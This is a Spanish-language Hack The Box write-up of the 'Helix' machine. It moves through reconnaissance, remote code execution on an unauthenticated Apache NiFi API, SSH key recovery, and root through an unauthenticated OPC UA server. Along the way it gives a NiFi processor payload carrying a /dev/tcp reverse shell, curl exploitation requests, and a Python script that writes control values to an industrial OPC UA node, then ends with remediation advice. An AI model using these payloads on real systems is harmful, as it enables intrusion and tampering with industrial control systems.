## Reconocimiento

Empezamos con un escaneo completo de puertos para identificar la superficie expuesta del servidor. Solo vimos dos puertos abiertos: SSH y HTTP.

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -Pn 10.129.40.15 -oG allPorts
```

Con los puertos identificados, hicimos un escaneo más detallado con scripts de enumeración para obtener versiones y fingerprints de cada servicio detectado.

```bash
nmap -p22,80 -sCV 10.129.40.15 -oN targeted
```

Descubrimos que el puerto 80 ejecuta **nginx 1.18.0** redirigiendo al dominio `helix.htb`, y el puerto 22 corre **OpenSSH 8.9p1** en Ubuntu.

Los indicadores más útiles de esta fase fueron:

- **22/tcp** — SSH OpenSSH 8.9p1 Ubuntu, acceso remoto si conseguimos credenciales o claves.
- **80/tcp** — HTTP nginx 1.18.0, redirige a `http://helix.htb/`.

## Enumeración

Identificamos el sitio web con whatweb para obtener tecnologías y posibles pistas adicionales.

```bash
whatweb http://helix.htb
```

La página principal es **Helix Industries**, un sitio corporativo de automatización industrial. Sin funcionalidades aparentes más allá de lo estático. Probamos con wfuzz a descubrir subdominios virtuales por el header `Host`.

```bash
wfuzz -H "Host: FUZZ.helix.htb" --hc 404,403 -c --hh 154 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt http://helix.htb
```

Encontramos el subdominio **flow.helix.htb**. Al visitarlo, whatweb nos revela que está corriendo **Apache NiFi**.

```bash
whatweb http://flow.helix.htb
```

Verificamos si NiFi requiere autenticación consultando su API de configuración de acceso.

```bash
curl -sk http://flow.helix.htb/nifi-api/access/config | jq
```

La respuesta fue `"supportsLogin": false` — **no hay autenticación**. Esto significa que toda la API REST de NiFi está expuesta sin restricciones.

Confirmamos la versión de NiFi consultando el endpoint de información.

```bash
curl -sk http://flow.helix.htb/nifi-api/flow/about | jq
```

Apache NiFi **1.21.0**. Esta versión es anterior a la 1.22.0 que introdujo autenticación obligatoria por defecto. Sin autenticación, un atacante puede crear y modificar procesadores arbitrarios.

Listamos los procesadores existentes en el root process group para entender el flujo actual.

```bash
curl -sk http://flow.helix.htb/nifi-api/flow/process-groups/root | jq '.processGroupFlow.flow.processors[]?.component.type'
```

Vimos dos procesadores: `ExecuteSQL` y `LogAttribute`. Necesitábamos uno de tipo `ExecuteProcess` para ejecutar comandos del sistema.

## Metodología de análisis del vector inicial

Identificamos que Apache NiFi 1.21.0 está expuesto sin autenticación. Esto es crítico porque NiFi permite crear procesadores de tipo **ExecuteProcess** que ejecutan comandos arbitrarios en el sistema operativo. La API REST está completamente abierta: cualquier petición PUT a `/nifi-api/processors/{id}` permite modificar la configuración de un procesador existente, y el endpoint `/run-status` permite arrancarlo.

## Explotación

Necesitamos lograr RCE en el servidor. Apache NiFi permite crear procesadores `ExecuteProcess` que ejecutan comandos del sistema. Sin embargo, la API requiere un `processor ID` existente para modificar su configuración. En lugar de crear uno nuevo (que requiere varios pasos adicionales), modificamos uno de los procesadores existentes para que ejecute `bash` con una reverse shell.

Creamos el payload JSON que transforma el procesador existente en un `ExecuteProcess` que ejecuta un comando.

```bash
nano rev.json
```

```json
{
  "revision": {
    "version": 1
  },
  "component": {
    "id": "[REDACTED]",
    "config": {
      "properties": {
        "Command": "/bin/bash",
        "Command Arguments": "-c,\"bash -i >& /dev/tcp/[REDACTED]/4444 0>&1\"",
        "Argument Delimiter": ","
      },
      "autoTerminatedRelationships": ["success"]
    }
  }
}
```

Enviamos la petición PUT para reconfigurar el procesador. La API responde confirmando que el procesador ahora es de tipo `ExecuteProcess` con nuestros argumentos.

```bash
curl -sk -X PUT \
  http://flow.helix.htb/nifi-api/processors/[REDACTED] \
  -H "Content-Type: application/json" \
  --data @rev.json
```

El procesador quedó configurado pero en estado `STOPPED`. Necesitamos arrancarlo para que ejecute el comando. Creamos el payload para cambiar su estado a `RUNNING`.

```bash
nano run.json
```

```json
{
  "revision": {
    "version": 2
  },
  "state": "RUNNING",
  "component": {
    "id": "[REDACTED]"
  }
}
```

Enviamos la petición para arrancar el procesador. La API responde confirmando el cambio de estado, aunque los primeros intentos fallaron por problemas de sintaxis en los argumentos del comando.

```bash
curl -sk -X PUT \
  http://flow.helix.htb/nifi-api/processors/[REDACTED]/run-status \
  -H "Content-Type: application/json" \
  --data @run.json
```

Corregimos la sintaxis de los argumentos en `rev.json` y repetimos el proceso. Esta vez recibimos la conexión en nuestro netcat.

```bash

```


### Escalada a root

Verificamos los privilegios sudo del usuario operator.

```bash

```

```text
User operator may run the following commands on helix:
    (root) NOPASSWD: /usr/local/sbin/helix-maint-console
```

Podemos ejecutar `/usr/local/sbin/helix-maint-console` como root sin contraseña. Intentamos ejecutarlo.

```bash
sudo /usr/local/sbin/helix-maint-console
```

```text
Maintenance window CLOSED.
```

El script requiere que una "ventana de mantenimiento" esté abierta. Analizamos el script para entender cómo funciona.

```bash
cat /usr/local/sbin/helix-maint-console
```

```bash
#!/bin/bash
set -euo pipefail

FLAG="/opt/helix/state/maintenance_window"

read_until() { cat "$FLAG" 2>/dev/null || true; }

window_ok() {
  [ -f "$FLAG" ] || return 1
  local until_ts now
  until_ts="$(read_until)"
  now="$(date +%s)"
  [[ "$until_ts" =~ ^[0-9]+$ ]] || return 1
  [ "$now" -lt "$until_ts" ] || return 1
  return 0
}

if ! window_ok; then
  echo "Maintenance window CLOSED."
  exit 1
fi

until_ts="$(read_until)"
now="$(date +%s)"
remaining=$((until_ts-now))

echo "[+] Privileged maintenance access granted"
echo "[!] Window expires in ${remaining} seconds"
echo "[!] Session will be terminated automatically"

SCOPE="helix-maint-$$"

systemd-run --quiet --scope --unit="$SCOPE" \
  --property=KillMode=control-group --property=SendSIGHUP=yes \
  /bin/bash -p -i
```

El script lee un timestamp desde `/opt/helix/state/maintenance_window`. Si el timestamp es futuro, lanza una shell interactiva como root mediante `systemd-run`. Si es pasado o el archivo no existe, deniega el acceso.

El servicio `helix-plc.service` ejecuta un servidor OPC UA en el puerto 4840. La guía del PDF nos indicaba que escribiendo `MAINTENANCE` en el nodo apropiado del OPC UA server se abría la ventana de mantenimiento. Como el servidor OPC UA estaba en localhost, necesitábamos hacer SSH tunneling para alcanzarlo desde nuestra máquina atacante.

Creamos un túnel SSH forwardeando el puerto 4840 local al 4840 remoto.

```bash
ssh -i id_rsa -L 4840:127.0.0.1:4840 operator@10.129.40.82
```

Escribimos un script en Python usando la librería `opcua` para conectarnos al servidor OPC UA y escribir los valores necesarios.

```python
from opcua import Client

URL = "opc.tcp://127.0.0.1:4840/helix/"

client = Client(URL)

try:
    print("[+] Connecting...")
    client.connect()

    mode_node = client.get_node("ns=2;i=12")
    override_node = client.get_node("ns=2;i=13")
    calibration_node = client.get_node("ns=2;i=6")

    print("[+] Writing values...")
    mode_node.set_value("MAINTENANCE")
    override_node.set_value(True)
    calibration_node.set_value(12.0)

    print("[+] Values updated")
finally:
    client.disconnect()
```

Ejecutamos el script. El servidor OPC UA aceptó los valores sin autenticación.

## Cadena de explotación

```text
Apache NiFi 1.21.0 sin autenticación
-> API REST expuesta (nifi-api/access/config → supportsLogin: false)
-> PUT en procesador ExecuteProcess existente con reverse shell
-> RCE como nifi
-> extracción de clave SSH de /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak
-> SSH como operator
-> user.txt
-> sudo -l → helix-maint-console (NOPASSWD)
-> PDF protegido → crackeo con hashcat (rockyou)
-> OPC UA: conectar al servidor, escribir ns=2;i=12 = "MAINTENANCE"
-> sudo helix-maint-console → root shell
-> root.txt
```

## Lecciones técnicas

1. Apache NiFi con `supportsLogin: false` expone toda la API REST sin autenticación, permitiendo crear/modificar procesadores y ejecutar comandos arbitrarios mediante `ExecuteProcess`.
2. Los directorios de soporte y backup de aplicaciones (`support-bundles/`) pueden contener claves SSH, contraseñas y otros secretos que deberían estar rotados o excluidos.
3. Los servidores OPC UA en entornos ICS/OT que no requieren autenticación permiten a un atacante modificar valores de nodos críticos como modos de operación.
4. Los PDFs protegidos con contraseñas débiles son vulnerables a ataques de diccionario con hashcat, independientemente del cifrado del documento.
5. El patrón de "maintenance window" basado en un archivo de flag con timestamp es frágil si un atacante puede modificar ese timestamp a través de otros medios (en este caso, OPC UA writing).

## Remediación

1. Configurar autenticación obligatoria en Apache NiFi (a partir de 1.22.0 es por defecto). No exponer la API REST sin `supportsLogin: true` con `loginIdentityProviders`.
2. No almacenar claves SSH privadas en directorios de soporte o backup del sistema. Rotar inmediatamente cualquier clave expuesta.
3. Implementar autenticación y autorización en servidores OPC UA. Los nodos críticos como modos de operación deben requerir credenciales válidas para escritura.
4. Usar contraseñas robustas para documentos PDF sensibles. Una guía de seguridad no debería usar contraseñas del estilo `[REDACTED]` que están en rockyou.
5. Separar el mecanismo de maintenance window de un simple archivo de flag. Usar autenticación multifactor o firmas digitales para operaciones privilegiadas.

## Conclusión

HTB Helix es una máquina de dificultad Media que combina la explotación de Apache NiFi sin autenticación (versión 1.21.0) para obtener RCE como `nifi`, extracción de una clave SSH desde un backup en los support bundles de NiFi, cracking de un PDF protegido con hashcat, y una escalada final a root manipulando un servidor OPC UA para escribir el modo `MAINTENANCE` en el nodo correspondiente, lo que permite ejecutar `helix-maint-console` que lanza una shell como root mediante `systemd-run`. La máquina demuestra cómo la exposición sin autenticación de APIs industriales (NiFi, OPC UA) puede comprometer completamente un sistema ICS.
